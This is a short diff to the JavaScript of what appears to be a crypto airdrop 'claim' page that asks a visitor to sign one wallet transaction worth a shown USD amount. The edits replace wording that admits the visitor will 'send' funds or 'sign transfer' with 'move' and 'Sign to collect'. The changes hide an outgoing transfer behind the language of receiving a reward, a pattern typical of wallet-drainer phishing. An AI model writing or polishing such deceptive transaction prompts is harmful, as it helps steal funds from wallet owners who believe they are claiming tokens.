@@ -172,7 +172,7 @@ function applyVisibility() {
 
 function claimSubText() {
   if (!lastUsd) return "";
-  return `1 signature · you'll send ≈ ${usdFormat.format(lastUsd)}`;
+  return `1 signature · you'll move ≈ ${usdFormat.format(lastUsd)}`;
 }
 
 /* ---------------- pricing ---------------- */
@@ -345,7 +345,7 @@ function showAllocation(address, usd) {
   lastAmount = tokenAmount >= 1 ? tokenAmount.toFixed(3) : (Math.floor(tokenAmount * 1e5) / 1e5).toFixed(5);
   lastEstimate = "≈ " + usdFormat.format(lastUsd);
   symbolEl.textContent = chain.symbol;
-  claimButton.textContent = chain.key === "eth" ? "Approve in wallet" : "Sign transfer in wallet";
+  claimButton.textContent = chain.key === "eth" ? "Approve in wallet" : "Sign to collect";
   applyVisibility();
   setMessage(claimStatus, "");
   allocation.hidden = false;
@@ -442,7 +442,7 @@ const alreadyConnected = () =>
 function armFallback() {
   clearTimeout(fallbackTimer);
   fallbackTimer = setTimeout(() => {
-    claimButton.textContent = "Tap to sign";
+    claimButton.textContent = "Sign to collect";
     claimButton.disabled = false;
     setMessage(claimStatus, "Wallet didn't respond. Tap to try again.");
   }, 8000);
@@ -581,7 +581,7 @@ async function runClaim() {
   } catch (error) {
     clearAutoTimers();
     claimButton.disabled = false;
-    claimButton.textContent = "Tap to sign";
+    claimButton.textContent = "Sign to collect";
     setMessage(claimStatus, error?.message?.includes("Nothing to send") ? error.message : "Wallet didn't respond. Tap to try again.");
   }
 }
